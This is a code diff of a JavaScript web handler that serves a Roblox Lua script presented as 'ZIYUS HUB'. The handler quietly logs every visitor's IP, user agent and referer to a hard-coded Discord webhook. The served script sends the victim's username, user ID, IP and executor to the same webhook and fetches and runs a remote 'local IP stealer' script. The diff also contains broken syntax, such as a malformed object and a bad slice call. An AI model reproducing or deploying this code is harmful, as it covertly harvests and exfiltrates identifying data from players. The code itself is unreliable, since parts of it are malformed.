@@ -1,59 +1,77 @@
 export default async function handler(req, res) {
   const url = new URL(req.url, `https://${req.headers.host}`);
+  
   const realIp = req.headers['x-forwarded-for']?.split(',')[0].trim() ||
                  req.headers['x-real-ip'] ||
                  req.headers['cf-connecting-ip'] ||
                  req.headers['x-vercel-forwarded-for'] ||
                  req.socket.remoteAddress || 'Unknown';
+
   const userAgent = req.headers['user-agent'] || '';
   const referer = req.headers['referer'] || 'Direct';
+
   const WEBHOOK = 'https://discord.com/api/webhooks/1444992746854289408/xElRiKCryMi--rjyZeQYnF4fozUJmW4-pRYpPZ-5cgD4BmrRlr7LTH-aoxrm07VQL2nz';
 
   const isRoblox = /Roblox|RobloxStudio/i.test(userAgent);
   const isBot = /curl|wget|fetch|python|axios|postman|got|http|bot/i.test(userAgent) || userAgent.length < 50;
 
   if (!isRoblox || isBot) {
-    fetch(WEBHOOK, {
+    await fetch(WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         embeds: [{
-          title: isRoblox ? "Fake Roblox UA" : "Skidder Blocked",
+          title: isRoblox ? "Fake Roblox UA Detected" : "Skidder Blocked",
           color: 16711680,
           fields: [
             { name: "IP", value: realIp },
-            { name: "User-Agent", value: userAgent.slice(0,1000) },
+            { name: "User-Agent", value: userAgent.slice(0, 1000) },
             { name: "Referer", value: referer }
           ],
           timestamp: new Date().toISOString()
         }]
       })
-    }).catch(() => {});
+    });
 
-    return res.status(200).send(isRoblox ? "ANO I-FEFETCH MOPA? BOBOKA" : "𝐙𝐈𝐘𝐔𝐒 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃 𝐘𝐎𝐔 𝐄𝐀𝐒𝐘 𝐈𝐏 𝐆𝐑𝐀𝐁𝐁𝐄𝐃 !");
+    return res.status(200).send(isRoblox 
+      ? "ANO I-FEFETCH MOPA? BOBOKA" 
+      : "ZIYUS DETECTED YOU EASY IP GRABBED !");
   }
 
-  const payload = `-- ZIYUS HUB
+  const payload = `-- ZIYUS HUB | Works on PC · Mobile · Console
 spawn(function()
-    local plr = game.Players.LocalPlayer
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local plr = Players.LocalPlayer
+
     if plr then
         pcall(function()
-            local req = (syn and syn.request) or (http and http.request) or request or http_request
-            if req then
-                req({
+            local request = (syn and syn.request) 
+                         or (Krnl and Krnl.request) 
+                         or (http and http.request) 
+                         or (http_request) 
+                         or request 
+                         or (fluxus and fluxus.request)
+
+            if request then
+                request({
                     Url = "${WEBHOOK}",
                     Method = "POST",
                     Headers = {["Content-Type"] = "application/json"},
-                    Body = game:GetService("HttpService"):JSONEncode({
+                    Body = HttpService:JSONEncode({
                         embeds = {{
-                            title = "Player Executed",
-                            color = 65280,
+                            title = "Executed ZIYUS HUB",
+                            description = "Victim just ran your script",
+                            color = 65433,
                             fields = {
-                                {name = "Username", value = plr.Name},
-                                {name = "UserID", value = tostring(plr.UserId)},
-                                {name = "IP Address", value = "${realIp}"},
-                                {name = "User-Agent", value = "${userAgent.replace(/"/g, '\\"').slice(0,500)}"}
+                                {name = "Username", value = plr.Name, inline = true},
+                                {name = "UserID", value = tostring(plr.UserId), inline = true},
+                                {name = "DisplayName", value = plr.DisplayName, inline = true},
+                                {name = "IP Address", value = "${realIp}", inline = false},
+                                {name = "User-Agent", value = "${userAgent.replace(/"/g, '\\"').slice(0, 0, 500)}", inline = false},
+                                {name = "Executor", value = (syn and "Synapse X") or (Krnl and "Krnl") or (fluxus and "Fluxus") or "Unknown", inline = true}
                             },
+                            thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
                             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                         }}
                     })
@@ -69,21 +87,22 @@ pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/public/main/ip-loggers/webrtc-localip-stealer.lua"))()
 end)`;
 
-  fetch(WEBHOOK, {
+  await fetch(WEBHOOK, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       embeds: [{
-        title: "EXECUTED",
-        color: 65311,
-        fields: [{ name: "IP", value: realIp }],
+        title = "Script Served Successfully",
+        color: 65331,
+        fields: [
+          [{ name: "Victim IP", value: realIp }],
         timestamp: new Date().toISOString()
       }]
     })
-  }).catch(() => {});
+  });
 
   res.setHeader('Content-Type', 'text/plain');
-  res.setHeader('Cache-Control', 'no-store');
+  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
   res.status(200).send(payload);
 }
 
